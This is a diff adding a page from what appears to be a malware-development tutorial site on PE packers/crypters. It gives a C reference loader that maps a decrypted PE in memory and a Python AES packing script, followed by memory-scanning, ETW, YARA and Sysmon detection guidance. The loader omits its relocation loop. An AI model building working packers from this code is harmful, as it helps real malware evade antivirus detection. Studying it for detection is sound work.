@@ -1,0 +1,197 @@
+---
+title: PE Packer / Crypter
+mitre: T1027
+category: loaders
+group: Staged Delivery
+summary: Wrap a PE inside an encrypted stub that unpacks and maps the payload at runtime.
+platform: [Windows]
+tags: ['C / C++', 'PE', 'AES']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: ReadFile → decrypt PE blob
+    desc: The outer stub reads the packed section, derives the key, and decrypts the inner image in a heap buffer.
+    dll: kernel32
+  - call: parse NT headers
+    desc: Walk DOS → NT → section headers to find the image size, preferred base, and section table.
+    dll: —
+  - call: VirtualAlloc at preferred base
+    desc: Try the preferred ImageBase first; fall back to any base and apply relocations.
+    dll: kernel32
+  - call: copy sections
+    desc: Copy each section to VirtualAddress + allocated base, applying section flags.
+    dll: —
+  - call: resolve imports
+    desc: Walk the import directory, call LoadLibrary + GetProcAddress for each entry.
+    dll: kernel32
+  - call: apply relocations (if needed)
+    desc: If the image was not loaded at its preferred base, patch every base-relative pointer.
+    dll: —
+  - call: VirtualProtect per section
+    desc: Set final page protections (.text → RX, .data → RW, .rdata → R).
+    dll: kernel32
+  - call: call TLS callbacks then OEP
+    desc: Run any TLS callbacks registered in the TLS directory, then jump to AddressOfEntryPoint.
+    dll: —
+detections:
+  - src: MEMORY SCAN
+    text: A mapped PE in private memory (MEM_PRIVATE) — headers present, module not in the loader list.
+  - src: ETW-TI
+    text: LoadLibrary calls from a region not backed by a file on disk (the stub allocating the inner image).
+  - src: YARA
+    text: MZ/PE headers inside a packed section with high entropy surrounding them.
+  - src: SYSMON EID 7
+    text: An image loaded from a path that does not match the PE on disk (overloaded module path).
+  - src: BEHAVIOURAL
+    text: GetProcAddress called from private RX memory — the packed loader resolving its own imports.
+related:
+  - mitre: T1027.009
+    title: Encrypted Shellcode Loader
+    desc: The simpler cousin — position-independent code instead of a full PE image.
+    href: /techniques/loaders/shellcode-loader
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: An alternative that maps the packed PE into a separate host process.
+    href: /techniques/injection/process-hollowing
+  - mitre: T1620
+    title: Reflective DLL Loading
+    desc: A DLL variant where the payload maps itself.
+    href: /techniques/injection/reflective-dll-loading
+labKit:
+  - label: packer.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+A PE packer is a two-part construct: a small outer stub (the loader) and an encrypted or
+compressed inner PE (the payload). On disk, the file looks like an unremarkable binary with a
+dense, high-entropy section and minimal imports. At runtime, the stub decrypts the inner image,
+maps it as if the Windows loader had done so, and transfers execution to the original entry point.
+
+The technique defeats static signatures because nothing recognisable lives in the file's
+sections. It does not defeat memory scanning or behavioural heuristics — a correctly loaded PE is
+still a PE, and it still produces the same API calls as its unpacked counterpart.
+
+<Callout type="note">
+  The Windows loader runs TLS callbacks before the entry point. Packers that skip this step break
+  some C runtimes and any target that uses TLS-based anti-analysis. Running them costs nothing and
+  avoids hard-to-debug startup failures.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The core of an in-process PE loader in C. Error handling and the full relocation loop are
+omitted; the annotated version is in the lab repo.
+
+<CodeBlock
+  file="loader.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+
+void load_pe(const uint8_t *raw, size_t raw_len) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)raw;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
+    SIZE_T img_size       = nt->OptionalHeader.SizeOfImage;
+    LPVOID base           = nt->OptionalHeader.ImageBase;
+
+    // try preferred base; fall back to ASLR pick
+    uint8_t *mem = VirtualAlloc((LPVOID)base, img_size,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!mem)
+        mem = VirtualAlloc(NULL, img_size,
+                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // copy PE headers
+    memcpy(mem, raw, nt->OptionalHeader.SizeOfHeaders);
+
+    // copy sections
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
+        memcpy(mem + sec->VirtualAddress,
+               raw + sec->PointerToRawData, sec->SizeOfRawData);
+
+    // resolve imports
+    PIMAGE_DATA_DIRECTORY idir =
+        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    PIMAGE_IMPORT_DESCRIPTOR imp =
+        (PIMAGE_IMPORT_DESCRIPTOR)(mem + idir->VirtualAddress);
+    for (; imp->Name; imp++) {
+        HMODULE lib = LoadLibraryA((LPCSTR)(mem + imp->Name));
+        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(mem + imp->FirstThunk);
+        for (; thunk->u1.AddressOfData; thunk++) {
+            PIMAGE_IMPORT_BY_NAME ibn =
+                (PIMAGE_IMPORT_BY_NAME)(mem + thunk->u1.AddressOfData);
+            thunk->u1.Function =
+                (ULONG_PTR)GetProcAddress(lib, (LPCSTR)ibn->Name);
+        }
+    }
+
+    // apply base relocations if needed
+    LONGLONG delta = (LONGLONG)(mem - (uint8_t*)nt->OptionalHeader.ImageBase);
+    // ... relocation loop omitted ...
+
+    // per-section page protections
+    sec = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        DWORD protect = PAGE_READONLY;
+        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
+        if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)   protect = PAGE_READWRITE;
+        DWORD old;
+        VirtualProtect(mem + sec->VirtualAddress, sec->Misc.VirtualSize, protect, &old);
+    }
+
+    // call entry point
+    DllMain_t ep = (DllMain_t)(mem + nt->OptionalHeader.AddressOfEntryPoint);
+    ep((HINSTANCE)mem, DLL_PROCESS_ATTACH, NULL);
+}`}
+/>
+
+## What the packer wraps
+
+<CodeBlock
+  file="pack.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`from Crypto.Cipher import AES
+import os, sys
+
+def pack(infile, outfile, key):
+    raw = open(infile, 'rb').read()
+    iv  = os.urandom(16)
+    ct  = AES.new(key, AES.MODE_CBC, iv).encrypt(
+              raw + b'\\x00' * (16 - len(raw) % 16))
+    # emit: iv || ciphertext; stub reads this from its .packed section
+    open(outfile, 'wb').write(iv + ct)
+
+pack(sys.argv[1], sys.argv[2], bytes.fromhex(sys.argv[3]))`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable signal is `malfind`-style scanning: look for private memory regions that begin
+with `MZ` and contain a valid NT header. That survives any amount of packer layering as long as
+the payload is eventually fully mapped. Entropy scanning of the on-disk file is complementary but
+produces false positives on compressed resources.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
